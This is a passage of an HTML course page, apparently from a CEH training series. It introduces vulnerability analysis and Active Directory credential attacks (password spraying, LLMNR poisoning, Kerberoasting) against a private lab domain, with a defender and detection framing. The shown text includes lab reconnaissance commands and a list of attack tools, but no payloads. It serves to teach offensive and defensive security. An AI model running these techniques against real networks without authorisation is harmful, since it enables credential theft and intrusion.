@@ -1,0 +1,2375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Session 04 — System Hacking I: Vulnerability Analysis, Authentication &amp; Password Attacks | CEH · ITGate Academy</title>
+<meta name="description" content="CEH Diploma Session 4 — turn the enumerated target profile into a vulnerability and a credential: CVE/CVSS + searchsploit + automated scanning, then NTLM/Kerberos, hash cracking, password spraying, LLMNR poisoning and Kerberoasting against a real ceh.lab domain — every attack carried through to its auth-log SOC flip, ending in a working credential-attack detection rule and an access plan.">
+<link rel="stylesheet" href="../assets/css/ceh.css">
+<link rel="icon" href="../assets/img/itgate-logo.jpg">
+</head>
+<body data-session="s04">
+
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="brand" href="../index.html">
+      <img src="../assets/img/itgate-logo.jpg" alt="ITGate Academy">
+      <span class="brand-text">
+        <span class="brand-name">ITGate Academy</span>
+        <span class="brand-sub">CEH · Session 04</span>
+      </span>
+    </a>
+    <nav class="topnav">
+      <a href="../index.html">All sessions</a>
+      <a href="../index.html#lab">Lab</a>
+      <a href="../index.html#resources">Resources</a>
+    </nav>
+  </div>
+</header>
+
+<div class="progress-wrap"><div class="wrap progress-inner" id="progressHost"></div></div>
+
+<div class="wrap section">
+<div class="page-layout">
+
+  <aside class="sidebar">
+    <h5>Session 04 · Pages</h5>
+    <ol id="sessionNav"></ol>
+  </aside>
+
+  <article>
+
+  <!-- ==========  SHARED SVG ARROW MARKERS (document-wide; keep at top so no diagram owns them)  ========== -->
+  <svg aria-hidden="true" focusable="false" width="0" height="0" style="position:absolute">
+    <defs>
+      <marker id="ar-o" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#ff7043"/></marker>
+      <marker id="ar-c" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#22d3ee"/></marker>
+      <marker id="ar-g" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#768290"/></marker>
+      <marker id="ar-r" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#e63946"/></marker>
+      <marker id="ar-grn" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#4ade80"/></marker>
+      <marker id="ar-am" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#fbbf24"/></marker>
+      <marker id="ar-pu" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#a78bfa"/></marker>
+    </defs>
+  </svg>
+
+  <!-- ==========  P1 · COVER  ========== -->
+  <section class="page" data-title="Welcome">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04</span><span class="tag offensive">System Hacking I · Access</span><span class="time">⏱ 4 hours</span></div>
+      <h1>Vulnerability Analysis, Authentication &amp; Password Attacks</h1>
+      <p class="lede">Recon was invisible. Scanning was loud. Today the enumerated services and users become
+         a <strong>vulnerability</strong> and a <strong>credential</strong> — and for the first time you attack a real domain.</p>
+    </div>
+    <div class="content">
+      <div class="oneline">Attackers don't break in — they log in. Session 3 found and enumerated the doors.
+        Session 4 is where you get the keys: match a version to a known weakness, then crack, spray, poison and
+        roast your way to a working credential — every step loud in the auth logs, so every step carries its SOC flip.</div>
+
+      <h2>Today's agenda</h2>
+      <div class="tbl-scroll">
+      <table>
+        <thead><tr><th>Block</th><th>What we do</th><th>Format</th><th>Min</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>Where we left off — the target profile becomes today's ammunition</td><td>Theory</td><td>8</td></tr>
+          <tr><td>2</td><td><strong>Lab pre-flight</strong> — the domain up, the profile in hand, rockyou unpacked</td><td>Hands-on</td><td>5</td></tr>
+          <tr><td colspan="4" class="mono" style="color:#ff7043">— Half A · Vulnerability Analysis —</td></tr>
+          <tr><td>3</td><td>Vulnerability concepts &amp; the vulnerability funnel</td><td>Theory</td><td>8</td></tr>
+          <tr><td>4</td><td>Research sources + CVSS scoring (the vector, not just the number)</td><td>Theory</td><td>9</td></tr>
+          <tr><td>5</td><td><code>searchsploit</code> + <code>nmap --script vuln</code></td><td>Theory</td><td>7</td></tr>
+          <tr><td>6</td><td><strong>Lab 1</strong> — version → CVE → "does a public exploit exist?"</td><td>Hands-on</td><td>16</td></tr>
+          <tr><td>7</td><td>Automated scanning — Nessus Essentials vs Greenbone/GVM</td><td>Theory</td><td>7</td></tr>
+          <tr><td>8</td><td><strong>Lab 2</strong> — a vuln scan, and the "critical" that's a false positive</td><td>Hands-on demo</td><td>8</td></tr>
+          <tr><td colspan="4" class="mono" style="color:#ff7043">— Half B · Authentication &amp; Password Attacks (the domain) —</td></tr>
+          <tr><td>9</td><td>Authentication + hashing vs encryption vs encoding</td><td>Theory</td><td>9</td></tr>
+          <tr><td>10</td><td>Where creds live + <strong>NTLM challenge-response</strong> (animated)</td><td>Theory</td><td>10</td></tr>
+          <tr><td>11</td><td><strong>Kerberos ticket flow</strong> (animated) + the two bleed points</td><td>Theory</td><td>10</td></tr>
+          <tr><td>12</td><td>Password-attack taxonomy + the hash-cracking pipeline</td><td>Theory</td><td>9</td></tr>
+          <tr><td>—</td><td>Break</td><td>—</td><td>10</td></tr>
+          <tr><td>13</td><td>Offline cracking — <code>hashcat</code> + <code>john</code></td><td>Theory</td><td>8</td></tr>
+          <tr><td>14</td><td><strong>Lab 3</strong> — crack SAM + <code>/etc/shadow</code>; the wordlist that fails</td><td>Hands-on</td><td>15</td></tr>
+          <tr><td>15</td><td>Online attacks — <code>hydra</code> · <code>netexec</code>; spray vs brute vs lockout</td><td>Theory</td><td>8</td></tr>
+          <tr><td>16</td><td><strong>Lab 4</strong> — password spray the DC → the 4625 spike</td><td>Hands-on</td><td>14</td></tr>
+          <tr><td>17</td><td><strong>LLMNR/NBT-NS poisoning</strong> + Responder</td><td>Theory</td><td>8</td></tr>
+          <tr><td>18</td><td><strong>Lab 5</strong> — poison a broadcast, capture a NetNTLMv2, crack it</td><td>Hands-on</td><td>14</td></tr>
+          <tr><td>19</td><td>Kerberoasting + AS-REP roasting + Impacket + <strong>pass-the-hash</strong></td><td>Theory</td><td>9</td></tr>
+          <tr><td>20</td><td><strong>Lab 6</strong> — roast a service ticket → the 4769; and the one that won't crack</td><td>Hands-on</td><td>15</td></tr>
+          <tr><td colspan="4" class="mono" style="color:#4ade80">— Defence · deliverable · bridge —</td></tr>
+          <tr><td>21</td><td>The auth-log SOC flip — 4625 / 4768-4769 / Responder side by side</td><td>Defender</td><td>6</td></tr>
+          <tr><td>22</td><td><strong>Lab 7</strong> — write the credential-attack detection rule (the signature exercise)</td><td>Hands-on</td><td>16</td></tr>
+          <tr><td>23</td><td><strong>Lab 8</strong> — assemble the access plan (Session 5's input)</td><td>Hands-on</td><td>12</td></tr>
+          <tr><td>24</td><td>Into Session 5 — shells &amp; Metasploit, framed (concept only)</td><td>Theory</td><td>6</td></tr>
+          <tr><td>25</td><td>Knowledge check · practice range · homework</td><td>Wrap-up</td><td>17</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="box key-takeaway">
+        <span class="box-t">What you hand in today</span>
+        <p>Two things. An <strong>access plan</strong> — per host: confirmed vulnerabilities (CVE + CVSS base score +
+           does a public exploit exist?), credentials obtained and <em>how</em> (cracked hash / password spray / LLMNR
+           poison / Kerberoast / pass-the-hash), and the single chosen way in. And <strong>one working credential-attack
+           detection rule</strong> (Sigma / SPL / KQL), written from auth-log evidence you generate yourself. The access
+           plan is Session 5's input. The rule is the job.</p>
+      </div>
+
+      <div class="box warn">
+        <span class="box-t">Authorisation — read before anything</span>
+        <p>Every attack today runs against <strong>your own host-only lab</strong> — Metasploitable2, Windows 7,
+           Windows 10, and the <span class="mono">ceh.lab</span> domain controller you built in Session 3. Cracking a
+           hash, spraying a password, or poisoning a broadcast on any network you don't own is a criminal offence. The
+           lab hands you the target <em>and</em> the authorisation. That authorisation does not travel.</p>
+      </div>
+
+      <div class="box soc">
+        <span class="box-t">The spine of the session</span>
+        <p>Authentication is the single most-attacked and most-monitored surface in any network. Every credential
+           attack you run today is loud in the auth logs — a spray spikes 4625, a Kerberoast lands in 4769, a poisoning
+           shows up the moment Responder answers. This is where the SOC earns its salary, so every attack carries its
+           auth-log flip, and the session ends with you writing the detection rule from logs you generated yourself.</p>
+      </div>
+    </div>
+  </section>
+  <!-- ==========  P2 · WHERE WE LEFT OFF  ========== -->
+  <section class="page" data-title="Where we left off">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P02</span><span class="tag theory">Bridge</span><span class="time">⏱ 8 min</span></div>
+      <h1>The Target Profile Becomes Ammunition</h1>
+      <p class="lede">Session 3 ended with a ranked, enumerated picture of every host. Today each line of it turns
+         into a vulnerability or a credential.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Where this follows from</span>
+        <p>You walked in with a <strong>target profile</strong>: open ports, exact service versions, users, shares,
+           SNMP/LDAP findings, and a ranked "most likely way in" per host. Recon (S2) built it without touching
+           anything; scanning (S3) confirmed it and lit up the target's logs. Session 4 spends it — and does so, for the
+           first time, against a <strong>real domain</strong>, not a standalone box.</p>
+      </div>
+
+      <p>The session is two halves that meet in the middle. The left half asks <em>"what is wrong with what I
+         found?"</em> — it turns a version string into a CVE, a CVSS score, and a yes/no on whether a public exploit
+         exists. The right half asks <em>"whose credential can I take?"</em> — it turns a hash or a ticket into a working
+         login. Both halves converge on the same thing: a <strong>way in</strong> that Session 5 will execute.</p>
+
+      <figure class="dgm">
+        <svg viewBox="0 0 940 300" role="img" aria-label="The two halves of Session 4 — vulnerability analysis and credential attacks — meeting at a single chosen way in that feeds Session 5.">
+          <!-- input -->
+          <rect x="16" y="122" width="150" height="56" rx="8" fill="#1f2533" stroke="#22d3ee"/>
+          <text class="d-title" x="91" y="146" text-anchor="middle" font-size="13">Target profile</text>
+          <text class="d-sub" x="91" y="164" text-anchor="middle">from Session 3</text>
+          <!-- half A -->
+          <rect x="230" y="34" width="330" height="96" rx="10" fill="#1a1f2a" stroke="#ff7043"/>
+          <text class="d-title" x="248" y="58" font-size="13" fill="#ff7043">Half A · Vulnerability analysis</text>
+          <text class="d-lbl d-mono" x="248" y="82" font-size="11.5">service + version → CVE → CVSS</text>
+          <text class="d-lbl d-mono" x="248" y="102" font-size="11.5">→ public exploit? → PoC</text>
+          <text class="d-sub" x="248" y="120">"what is wrong with what I found?"</text>
+          <!-- half B -->
+          <rect x="230" y="170" width="330" height="96" rx="10" fill="#1a1f2a" stroke="#ff7043"/>
+          <text class="d-title" x="248" y="194" font-size="13" fill="#ff7043">Half B · Authentication &amp; password attacks</text>
+          <text class="d-lbl d-mono" x="248" y="218" font-size="11.5">hash / ticket → crack · spray</text>
+          <text class="d-lbl d-mono" x="248" y="238" font-size="11.5">→ poison · roast · pass-the-hash</text>
+          <text class="d-sub" x="248" y="256">"whose credential can I take?"</text>
+          <!-- converge -->
+          <rect x="620" y="112" width="150" height="76" rx="10" fill="#1f2533" stroke="#e63946"/>
+          <text class="d-title" x="695" y="140" text-anchor="middle" font-size="13">A way in</text>
+          <text class="d-sub" x="695" y="160" text-anchor="middle">the access plan</text>
+          <text class="d-sub" x="695" y="176" text-anchor="middle">(today's deliverable)</text>
+          <!-- s5 -->
+          <rect x="812" y="122" width="112" height="56" rx="8" fill="#1f2533" stroke="#a78bfa"/>
+          <text class="d-title" x="868" y="146" text-anchor="middle" font-size="12.5" fill="#a78bfa">Session 5</text>
+          <text class="d-sub" x="868" y="164" text-anchor="middle">exploit it</text>
+          <!-- arrows: profile to both halves -->
+          <path d="M166,142 C198,120 200,96 228,84" fill="none" stroke="#22d3ee" stroke-width="1.6" marker-end="url(#ar-c)"/>
+          <path d="M166,158 C198,180 200,206 228,216" fill="none" stroke="#22d3ee" stroke-width="1.6" marker-end="url(#ar-c)"/>
+          <!-- halves to converge -->
+          <path d="M560,82 C596,100 596,124 618,138" fill="none" stroke="#ff7043" stroke-width="1.6" marker-end="url(#ar-o)"/>
+          <path d="M560,218 C596,200 596,176 618,162" fill="none" stroke="#ff7043" stroke-width="1.6" marker-end="url(#ar-o)"/>
+          <!-- converge to s5 -->
+          <path d="M770,150 L808,150" fill="none" stroke="#e63946" stroke-width="1.8" marker-end="url(#ar-r)"/>
+        </svg>
+        <figcaption><b>Two questions, one answer.</b> Vulnerability analysis and credential attacks converge on a single
+           chosen way in per host — the access plan — which is exactly what Session 5 turns into a shell.</figcaption>
+      </figure>
+
+      <div class="box soc">
+        <span class="box-t">Why this session is where the SOC lives</span>
+        <p>A port scan is noise a firewall logs. A <em>credential attack</em> is an alarm an identity platform screams
+           about — a spray, a Kerberoast, a poisoning are the highest-signal events on the whole ATT&amp;CK matrix,
+           because authentication is what everything else is protecting. Learn the attack and you can run it once; learn
+           what it writes to the log and you can catch it every day. That second skill is the tier-1-into-tier-2 SOC job.</p>
+      </div>
+
+      <h2>Where today sits on ATT&amp;CK</h2>
+      <p>Session 3 lived in <strong>Discovery</strong>. Today we move into <strong>Credential Access</strong> — the
+         tactic every technique below belongs to — and hand off to <strong>Lateral Movement / Exploitation</strong> at
+         the end. (IDs verified against the live ATT&amp;CK matrix.)</p>
+      <div class="tbl-scroll">
+      <table>
+        <thead><tr><th>Tactic</th><th>Technique (today)</th><th>Where in this session</th></tr></thead>
+        <tbody>
+          <tr><td>TA0007 Discovery</td><td>Vulnerability scanning (part of active scanning)</td><td>Half A — vuln analysis</td></tr>
+          <tr><td rowspan="5">TA0006 Credential Access</td><td>T1110.001 Brute Force: Password Guessing · T1110.003 Password Spraying</td><td>Lab 4</td></tr>
+          <tr><td>T1003 OS Credential Dumping — .001 LSASS · .002 SAM · .003 NTDS</td><td>Lab 3 / Lab 6</td></tr>
+          <tr><td>T1558.003 Kerberoasting · T1558.004 AS-REP Roasting</td><td>Lab 6</td></tr>
+          <tr><td>T1557.001 LLMNR/NBT-NS Poisoning &amp; SMB Relay</td><td>Lab 5</td></tr>
+          <tr><td>T1550.002 Use Alternate Auth Material: Pass the Hash</td><td>Lab 6</td></tr>
+          <tr><td>TA0008 / TA0002 (hand-off)</td><td>T1210 Exploitation of Remote Services</td><td>Into Session 5</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="box key-takeaway">
+        <span class="box-t">The one idea</span>
+        <p>You rarely need to "break" anything. A missing patch, a reused password, a service account with a weak
+           secret, a workstation that still trusts a broadcast — each hands you a <strong>legitimate credential or a
+           known exploit</strong>. Attackers log in. Your job on the other side is to notice when a login isn't one.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P3 · LAB PRE-FLIGHT  ========== -->
+  <section class="page" data-title="Lab pre-flight">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P03</span><span class="tag lab">Hands-on · everyone</span><span class="time">⏱ 5 min</span></div>
+      <h1>Pre-flight — the Domain Up, the Profile in Hand</h1>
+      <p class="lede">Five minutes so nobody spends the session fighting a dead VM. Today's attacks need the domain
+         answering and your wordlist unpacked.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why this comes first</span>
+        <p>Half of today runs against the <span class="mono">ceh.lab</span> domain controller. If the DC isn't up,
+           LDAP/Kerberos are dead and Kerberoasting, spraying and LLMNR have nothing to talk to. Confirm the lab is
+           healthy now, exactly as you did before Session 3 — plus two Session-4-specific checks.</p>
+      </div>
+
+      <div class="box warn">
+        <span class="box-t">Revert to <span class="mono">baseline-s4</span>, not an older snapshot</span>
+        <p>The DC now carries a third snapshot, <span class="mono">baseline-s4</span> (SPN + spray passwords + lockout
+           policy on top of the domain). Reverting to <span class="mono">baseline-dc</span> or earlier silently removes
+           the Kerberoast target and the spray accounts, and half the labs return nothing.</p>
+      </div>
+
+      <ol class="steps">
+        <li>
+          <strong>All five VMs on the host-only network</strong>, and the DC reachable.
+          <pre><code># from Kali
+ip a | grep -A2 'ens\|eth'                    # your host-only IP
+sudo nmap -sn 192.168.56.0/24                 # expect Kali + MSF2 + Win7 + Win10 + DC
+# DC alive on the domain ports?
+nmap -Pn -p 88,389,445,636 192.168.56.10      # 88=Kerberos, 389/636=LDAP, 445=SMB</code></pre>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>All four targets answer; the DC shows <span class="mono">88</span>, <span class="mono">389</span> and <span class="mono">445</span> open</li>
+              <li>You have each host's IP written down (they feed every lab today)</li>
+            </ul>
+          </div>
+        </li>
+        <li>
+          <strong>The directory answers</strong> — so Kerberos and LDAP are really live.
+          <pre><code>ldapsearch -x -H ldap://192.168.56.10 -s base namingContexts   # → DC=ceh,DC=lab
+nxc smb 192.168.56.10                                          # name, domain, signing</code></pre>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>Base naming context is <span class="mono">DC=ceh,DC=lab</span></li>
+              <li><span class="mono">nxc</span> reports the host as a domain controller for <span class="mono">ceh.lab</span></li>
+            </ul>
+          </div>
+        </li>
+        <li>
+          <strong>Your Session 3 target profile is open</strong>, and your wordlist is unpacked.
+          <pre><code># rockyou ships gzipped on current Kali — unpack it once
+sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
+wc -l /usr/share/wordlists/rockyou.txt         # ~14 million lines
+# confirm today's tools resolve
+which hashcat john hydra nxc responder impacket-GetUserSPNs evil-winrm searchsploit</code></pre>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li><span class="mono">rockyou.txt</span> exists and has ~14M lines</li>
+              <li>Every tool resolves to a path (install lines are in the guided lab if one is missing)</li>
+              <li>Your target profile's <strong>version strings</strong> and <strong>user list</strong> are in front of you — they are today's inputs</li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <div class="box tip">
+        <span class="box-t">If a VM died</span>
+        <p>Every lab today ships a <span class="mono">saved/</span> evidence fallback (a captured hash file, a pcap, a
+           ticket) so you can still do the analysis and write the rule even if your VM won't boot. Ask for it rather than
+           sitting out — the detection half matters more than the attack half.</p>
+      </div>
+    </div>
+  </section>
+  <!-- ==========  P4 · VULNERABILITY CONCEPTS + FUNNEL  ========== -->
+  <section class="page" data-title="Vulnerability concepts">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P04</span><span class="tag theory">Method · the funnel</span><span class="time">⏱ 8 min</span></div>
+      <h1>From an Open Port to a Known Weakness</h1>
+      <p class="lede">Enumeration told you <em>what</em> is running. Vulnerability analysis answers the next
+         question: <em>what is wrong with it, and can someone exploit that?</em></p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why this follows the target profile</span>
+        <p>Your profile lists exact versions — <span class="mono">vsftpd 2.3.4</span>, <span class="mono">Samba
+           3.0.20</span>, an unpatched Windows 7. Each version string is a <strong>search key</strong>. Vulnerability
+           analysis is the disciplined step between "I know what's running" and "I'm going to exploit it" — skip it and
+           you're firing exploits blind.</p>
+      </div>
+
+      <h2>What a vulnerability actually is</h2>
+      <p>A <strong>vulnerability</strong> is a weakness that can be exploited — from a missing patch, a
+         misconfiguration, an insecure design, or a careless user. Two terms students conflate:</p>
+      <div class="tbl-scroll">
+      <table>
+        <thead><tr><th>Term</th><th>What it is</th><th>Stops at</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Vulnerability assessment</strong></td><td>Finding weaknesses — scanning, version matching, scoring</td><td><em>Finding</em>. No exploitation.</td></tr>
+          <tr><td><strong>Penetration testing</strong></td><td>Finding <em>and</em> exploiting them to prove impact</td><td>Proof — a shell, a credential, data</td></tr>
+        </tbody>
+      </table>
+      </div>
+      <p>Today is the bridge: Half A is assessment (find + score + confirm an exploit exists); the labs then cross into
+         exploitation only where you have authorisation and a working credential. Session 5 does the full exploitation.</p>
+
+      <h2>The vulnerability funnel</h2>
+      <p>Every finding runs the same pipeline. It <em>narrows</em>: a box has dozens of services, a handful have known
+         CVEs, fewer have a public exploit, and one is your best way in. Click each stage.</p>
+
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 250" role="img" aria-label="The vulnerability funnel: enumerated service and version narrows to a CVE, a CVSS score, a public-exploit check, a proof of concept, and the Session 5 hand-off.">
+          <g class="node" data-node="svc" tabindex="0">
+            <rect x="12" y="70" width="150" height="110" rx="9" fill="#1f2533" stroke="#22d3ee"/>
+            <text class="d-title" x="87" y="112" text-anchor="middle" font-size="12.5">Service +</text>
+            <text class="d-title" x="87" y="130" text-anchor="middle" font-size="12.5">version</text>
+            <text class="d-sub" x="87" y="152" text-anchor="middle">from enumeration</text>
+          </g>
+          <g class="node" data-node="cve" tabindex="0">
+            <rect x="196" y="80" width="140" height="90" rx="9" fill="#1a1f2a" stroke="#ff7043"/>
+            <text class="d-title" x="266" y="118" text-anchor="middle" font-size="12.5">CVE</text>
+            <text class="d-sub" x="266" y="138" text-anchor="middle">known identifier</text>
+          </g>
+          <g class="node" data-node="cvss" tabindex="0">
+            <rect x="370" y="90" width="140" height="70" rx="9" fill="#1a1f2a" stroke="#fbbf24"/>
+            <text class="d-title" x="440" y="120" text-anchor="middle" font-size="12.5">CVSS score</text>
+            <text class="d-sub" x="440" y="139" text-anchor="middle">how bad · 0–10</text>
+          </g>
+          <g class="node" data-node="exploit" tabindex="0">
+            <rect x="544" y="98" width="150" height="54" rx="9" fill="#1a1f2a" stroke="#ff7043"/>
+            <text class="d-title" x="619" y="122" text-anchor="middle" font-size="12.5">Public exploit?</text>
+            <text class="d-sub" x="619" y="140" text-anchor="middle">searchsploit / EDB</text>
+          </g>
+          <g class="node" data-node="poc" tabindex="0">
+            <rect x="726" y="104" width="120" height="42" rx="9" fill="#1a1f2a" stroke="#e63946"/>
+            <text class="d-title" x="786" y="129" text-anchor="middle" font-size="12">PoC ready</text>
+          </g>
+          <g class="node" data-node="s5" tabindex="0">
+            <rect x="866" y="108" width="62" height="34" rx="8" fill="#1f2533" stroke="#a78bfa"/>
+            <text class="d-title" x="897" y="129" text-anchor="middle" font-size="11" fill="#a78bfa">S5</text>
+          </g>
+          <!-- connectors through the vertical centre gutter, never over labels -->
+          <path d="M162,125 L194,125" fill="none" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <path d="M336,125 L368,125" fill="none" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <path d="M510,125 L542,125" fill="none" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <path d="M694,125 L724,125" fill="none" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <path d="M846,125 L864,125" fill="none" stroke="#a78bfa" stroke-width="1.6" marker-end="url(#ar-pu)"/>
+        </svg>
+        <div class="dgm-hint">Click each stage — what it is, and where it can dead-end.</div>
+        <div class="dgm-detail" data-detail="svc"><h5><span class="dd-tag">STAGE 1</span>Service + version</h5><p><b>The input, taken verbatim from your profile.</b> Precision matters — <span class="mono">vsftpd 2.3.4</span> has a backdoor; <span class="mono">2.3.5</span> does not. A wrong or fuzzy version (an <span class="mono">-sV</span> guess of <span class="mono">tcpwrapped</span>) sends you down the wrong CVE and wastes the session. Confirm the version by hand if the scanner hedged.</p></div>
+        <div class="dgm-detail" data-detail="cve"><h5><span class="dd-tag">STAGE 2</span>CVE — the identifier</h5><p><b>A CVE is a catalogue number for one specific flaw</b> (e.g. <span class="mono">CVE-2017-0144</span> = EternalBlue). It is not a score and not an exploit — just a globally-agreed name so everyone means the same bug. You find them by searching the version string in the NVD / MITRE / vendor advisories.</p></div>
+        <div class="dgm-detail" data-detail="cvss"><h5><span class="dd-tag">STAGE 3</span>CVSS — how bad</h5><p><b>A 0–10 severity score with a vector behind it.</b> It tells you <em>priority</em>, not <em>reachability</em> — a 9.8 that needs local access you don't have is lower value to you right now than a 7.5 you can reach over the network. Read the vector, not just the number (next page).</p></div>
+        <div class="dgm-detail" data-detail="exploit"><h5><span class="dd-tag">STAGE 4</span>Does a public exploit exist?</h5><p><b>The make-or-break question.</b> A scary CVE with no working exploit is a report line; one with a Metasploit module or an Exploit-DB PoC is a way in. <span class="mono">searchsploit</span> and Exploit-DB answer it in seconds. This is where the funnel narrows hardest — most CVEs never get a reliable public exploit.</p></div>
+        <div class="dgm-detail" data-detail="poc"><h5><span class="dd-tag">STAGE 5</span>PoC ready</h5><p><b>You have located a proof-of-concept</b> and read enough of it to know its target, its requirements, and its blast radius. You do <em>not</em> run it here — you record it in the access plan. Firing an exploit you haven't read is how a pentest becomes an outage.</p></div>
+        <div class="dgm-detail" data-detail="s5"><h5><span class="dd-tag">HAND-OFF</span>Session 5</h5><p><b>The funnel's output is one line in your access plan:</b> "CVE-X, CVSS Y, public exploit: yes (module/EDB-id)." Session 5 takes that line and turns it into a shell. Today stops at "the key exists"; next session turns it.</p></div>
+      </figure>
+
+      <div class="box key-takeaway">
+        <span class="box-t">The one thing</span>
+        <p>Vulnerability analysis is the bridge between enumeration (what's running) and exploitation (getting in). It
+           answers <em>"what weakness exists in what I found, and can anyone actually exploit it?"</em> — and it turns a
+           pile of versions into a ranked, defensible list of ways in.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P5 · RESEARCH SOURCES + CVSS  ========== -->
+  <section class="page" data-title="Research sources &amp; CVSS">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P05</span><span class="tag theory">Method · scoring</span><span class="time">⏱ 9 min</span></div>
+      <h1>Where to Look, and How Bad It Is</h1>
+      <p class="lede">Four sources answer "is this known?", and one scoring system answers "how bad?" — but the score
+         you can act on is in the <em>vector</em>, not the headline number.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why this follows the funnel</span>
+        <p>The funnel's middle two stages — CVE and CVSS — both come from research sources. Knowing <em>which</em> source
+           answers <em>which</em> question keeps you out of vendor marketing and inside authoritative data.</p>
+      </div>
+
+      <h2>The research sources</h2>
+      <div class="tbl-scroll">
+      <table>
+        <thead><tr><th>Source</th><th>URL</th><th>Answers</th></tr></thead>
+        <tbody>
+          <tr><td><strong>NIST NVD</strong></td><td class="mono">nvd.nist.gov</td><td>The CVE with its CVSS score, vector, and affected versions. Your first stop.</td></tr>
+          <tr><td><strong>MITRE CVE</strong></td><td class="mono">cve.org</td><td>The authoritative CVE record (MITRE moved from <span class="mono">cve.mitre.org</span> to <span class="mono">cve.org</span>). Identifier + description.</td></tr>
+          <tr><td><strong>Exploit-DB</strong></td><td class="mono">exploit-db.com</td><td>Whether a <em>public exploit</em> exists, mapped to the CVE. Backs <span class="mono">searchsploit</span>.</td></tr>
+          <tr><td><strong>Vendor advisories</strong></td><td class="mono">msrc / vendor sites</td><td>The patch, the workaround, the real affected build numbers.</td></tr>
+          <tr><td><strong>FIRST CVSS calculator</strong></td><td class="mono">first.org/cvss/calculator</td><td>Build or read a vector, and see how each metric moves the score.</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h2>CVSS — read the vector, not the number</h2>
+      <p>The <strong>Common Vulnerability Scoring System</strong> maps a vulnerability to <strong>0–10</strong>. The
+         number sets the severity band; the <strong>vector string</strong> behind it tells you whether <em>you</em> can
+         use it right now.</p>
+
+      <figure class="dgm">
+        <svg viewBox="0 0 940 320" role="img" aria-label="CVSS v3.1 base metrics — exploitability metrics and impact metrics combine into a score and a severity band, shown with the EternalBlue example vector.">
+          <text class="d-title" x="20" y="26" font-size="13">CVSS v3.1 base vector — the eight base metrics</text>
+          <!-- exploitability group -->
+          <rect x="16" y="44" width="440" height="150" rx="10" fill="#1a1f2a" stroke="#ff7043"/>
+          <text x="36" y="68" font-size="12" fill="#ff7043" class="d-mono">EXPLOITABILITY — can they reach it?</text>
+          <rect x="36" y="80" width="92" height="44" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="82" y="100" text-anchor="middle" font-size="11">AV</text><text class="d-sub" x="82" y="116" text-anchor="middle">Attack Vector</text>
+          <rect x="140" y="80" width="92" height="44" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="186" y="100" text-anchor="middle" font-size="11">AC</text><text class="d-sub" x="186" y="116" text-anchor="middle">Attack Complexity</text>
+          <rect x="244" y="80" width="92" height="44" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="290" y="100" text-anchor="middle" font-size="11">PR</text><text class="d-sub" x="290" y="116" text-anchor="middle">Privileges Req.</text>
+          <rect x="348" y="80" width="92" height="44" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="394" y="100" text-anchor="middle" font-size="11">UI</text><text class="d-sub" x="394" y="116" text-anchor="middle">User Interaction</text>
+          <text class="d-sub" x="36" y="150">S — Scope: does it break out of its security boundary?</text>
+          <rect x="36" y="158" width="120" height="26" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="96" y="175" text-anchor="middle" font-size="11">S · Scope</text>
+          <!-- impact group -->
+          <rect x="484" y="44" width="300" height="150" rx="10" fill="#1a1f2a" stroke="#e63946"/>
+          <text x="504" y="68" font-size="12" fill="#e63946" class="d-mono">IMPACT — what they get</text>
+          <rect x="504" y="80" width="80" height="44" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="544" y="100" text-anchor="middle" font-size="11">C</text><text class="d-sub" x="544" y="116" text-anchor="middle">Confidentiality</text>
